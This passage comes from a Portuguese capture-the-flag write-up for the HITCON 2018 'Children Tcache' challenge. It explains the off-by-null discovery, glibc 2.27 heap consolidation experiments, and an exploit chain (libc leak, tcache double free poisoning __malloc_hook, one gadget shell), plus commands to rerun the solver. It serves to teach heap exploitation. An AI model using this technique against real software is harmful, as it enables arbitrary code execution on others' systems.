0xbee: call __read_chk             ; read(0, buf, size) -- no máximo `size`
0xc25: cmp al, 0x0a               ; o último byte lido é '\n'?
0xc39: mov BYTE PTR [rax], 0x0     ; se sim, troca por NUL
```

Em `delete` (`0xec9`):

```
0xf57: mov esi, 0xda
0xf5f: call memset                 ; preenche `size` bytes com 0xda
0xf7e: call free
0xf96: data_list[i] = NULL         ; sem UAF pelo slot
0xfb1: size_list[i] = NULL
```

Essa função explica uma dificuldade do desafio: como o chunk é **inteiro** sobrescrito com `0xda` antes do `free`, não é possível forjar `prev_size` para a consolidação retroativa “clássica”. O write-up precisa, então, encontrar um caminho que não dependa de `prev_size` forjado, que é o uso do `last_remainder`.

### 10.4 Deduzir o off-by-null a partir do contrato das funções

A análise estática só vira vulnerabilidade quando se combinam os contratos:

1. `get_str` lê no máximo `size` bytes e **remove o `\n` se ele estiver presente**.
2. `strcpy` copia até o NUL. O buffer de pilha foi zerado com `memset(buf, 0, 0x2010)` antes da leitura.
3. Se a entrada ocupa exatamente `size` bytes, não há NUL dentro dos bytes lidos, e o NUL gerado pelo `strcpy` cai em `dest[size]`.

A geometria (`0x108` → chunk `0x110`; NUL em `dest[0x108]`, que é o LSB do `size` do vizinho) está detalhada na Seção 6.1. Aqui basta registrar a hipótese: `size` do próximo chunk `0x111` vira `0x100`, limpando o `PREV_INUSE`. O write-up trata isso como uma **hipótese verificável**, não como leitura de código-fonte, e a confirmação vem na Seção 10.5.

### 10.5 Confirmar o comportamento da heap sem gdb

Como o ambiente não tinha gdb, a alternativa foi ler a memória do processo diretamente:

- `/proc/<pid>/maps` fornece a faixa `[heap]`.
- `/proc/<pid>/mem` permite ler cabeçalhos de chunk por `pread`.
- para achar o chunk, o harness procura o padrão de bytes conhecido (ex.: `b"A"*32`) e subtrai `0x10` do ponteiro de usuário.

O cuidado específico da instrumentação (o envio de comandos é discutido na Seção 7.6) foi a **leitura bufferizada**: usar `select()` sobre um `BufferedReader` do Python dá falso negativo, porque os bytes já foram puxados para o buffer interno do objeto e não estão mais no pipe. O harness passou a abrir o processo com `bufsize=0` e a usar `os.read`/`read(1)` sobre o descritor cru.

Com isso, a hipótese da Seção 10.4 vira medida. O resultado (e a saída completa do `probe.py`) está na Seção 5.2; em resumo, o `size` do vizinho cai de `0x111` para `0x100`.

O `prev_size` com `A`s prova que a escrita atravessou o cabeçalho, e o `size = 0x100` prova o efeito no metadado. É a mesma evidência que fundamenta a Seção 7.1.

### 10.6 Reconstruir o comportamento do alocador

A parte mais delicada não é o binário, e sim a glibc. O método foi isolar cada pergunta e respondê-la com um experimento:

| Pergunta | Experimento | Evidência |
|---|---|---|
| Quantos chunks cabem no tcache? | alocar 7, liberar 7, liberar mais um | o 8º `free` sai do tcache; para chunks acima do `fastbin` (como `0x110`) vai ao *unsorted bin*; chunks pequenos vão ao fastbin |
| `free(B)` mexe em C? | ler o header de C depois de `free(B)` | `C.prev_size=0x110`, `C.size=0x110` (PREV_INUSE limpo) |
| `free(A)` consolida com B? | ler o header de A | `size=0x221` (0x220 de bloco) |
| O split do `last_remainder` chama `unlink`? | pedir `0x80` com o remainder corrompido | não aborta: o caminho especial não chama `unlink` |
| `free(C)` consolida para trás? | ler o topo depois de `free(C)` | topo em `b1`, `campo size=0x20141`, com `b2` alocado dentro |

A explicação do passo “`free(C)` consolida para trás” veio da leitura combinada de três campos:

- `C.PREV_INUSE = 0` (herdado de `free(B)`).
- `C.prev_size = 0x110` (reescrito pelo split do remainder).
- `C - 0x110 = b1`, e `b1` está no *unsorted bin* com `foot` válido (`b2.prev_size = 0x90`).

Isso fecha a conta que o `free` faz: consolidação retroativa até b1, `unlink(b1)` válido, topo movido para b1. Sem essa leitura de headers, o comportamento pareceria mágica, mas com ela fica claro que é consequência direta dos metadados.

### 10.7 Reconstruir a cadeia de controle

Com a sobreposição medida, o restante é encadeamento:

1. **Leak:** alocar `0x500` sobre `b2`, liberar e ler `show(0)`. O `fd` do *unsorted bin* é `main_arena + 0x60`. O offset `0x3ebca0` foi confirmado pelo alinhamento da base (`base & 0xfff == 0`).
2. **Símbolos da libc:** `readelf -sW libc.so.6 | grep __malloc_hook` → `0x3ebc30`. O mesmo comando localiza `__free_hook` (`0x3ed8e8`).
3. **One gadget:** desmontar candidatos e checar as restrições:
   ```bash
   objdump -d --start-address=0x4f322 --stop-address=0x4f330 libc.so.6
   # execve("/bin/sh", rsp+0x40, environ); [rsp+0x40] == NULL
   ```
4. **Tcache dup:** liberar duas vezes o chunk sobreposto. Na 2.27 não há `key`, então a lista vira `chunk -> chunk`, e a partir daí o `next` é envenenado com `__malloc_hook`.
5. **Gatilho:** o próximo `malloc` chama `__malloc_hook`, e a escrita do gadget nesse endereço transforma o alocador em execução de código.

Cada elo foi testado isoladamente: primeiro o leak (base alinhada), depois o dup (lista do tcache inspecionável), por fim o gatilho (shell). Se um elo falhasse, o problema ficava restrito a ele.

### 10.8 Evidência × hipótese: o mapa do write-up

| Afirmação no write-up | Onde foi obtida |
|---|---|
| Menu e limites (10 slots, `0x2000`) | desmonte de `main` e `new_heap` |
| `strcpy` sem limite | import + chamada em `0xdca` |
| NUL no `size` do vizinho | aritmética de chunk + `probe.py` |
| `0xda` impede forjar `prev_size` | desmonte de `delete` (`memset` `0xda`) |
| Consolidação A+B | header `0x221` medido |
| Split sem `unlink` | remainder corrompido não aborta |
| Consolidação retroativa | topo em b1 + headers de C/b1/b2 |
| Leak `main_arena+0x60` | `show(0)` após `free` do `0x510` |
| `__malloc_hook` | `readelf` da libc do handout |
| One gadget `0x4f322` | desmonte + teste de shell |
| Flag | saída do shell local (`cat flag`) |

### 10.9 Roteiro reproduzível

Do zero, nesta ordem:

```bash
# 1. integridade e triagem
cd challenge && sha256sum -c SHA256SUMS
readelf -h children_tcache && readelf -lW children_tcache
readelf -sW children_tcache && strings -a children_tcache

# 2. desmonte do entry point e do menu
objdump -d -M intel --start-address=0x9c0 --stop-address=0x1100 children_tcache

# 3. reproduzir o off-by-null e ler os headers
cd .. && python3 solver/probe.py

# 4. executar a cadeia completa
python3 solver/exploit.py
```

O ponto central do método é não aceitar nenhuma afirmação sem uma evidência reproduzível: cada seção do write-up corresponde a um comando, um trecho de desmonte ou um valor de header observado. É isso que torna o texto reconstruível por outra pessoa — e não apenas uma narrativa de um exploit que funcionou.

---

## 11. Materiais públicos e referências

- Desafio preservado: <https://pwn.college/ctf-archive/hitconctf2018> (PWN - 246 - Children Cache, 1 solve).
- Evento no CTFtime: <https://ctftime.org/event/669>.
- Write-up de referência (overlapping chunks e `last_remainder`): <https://hpasserby.top/post/cdad9cf7.html>.
- Write-up com o fluxo de `last_remainder`, leak e *one gadget*: <https://voidma.in//posts/writeups/2018/10/20/writeup-hitcon19quals-children-tcache.html> e <https://ctftime.org/writeup/11929> (fonte da flag histórica).
- Handout com binário e `libc.so.6`: pacote `children_tcache.zip` distribuído junto ao write-up do Hpasserby.
- Loader `ld-2.27.so`: pacote Ubuntu `libc6_2.27-3ubuntu1_amd64.deb` (<http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb>), do mesmo *build* da `libc.so.6` do handout.
- Ferramenta `one_gadget`: <https://github.com/david942j/one_gadget>.
- Documentação do alocador: código-fonte da `glibc 2.27` (`malloc/malloc.c`), em especial `_int_malloc`, `_int_free` e `unlink_chunk` (<https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c>).


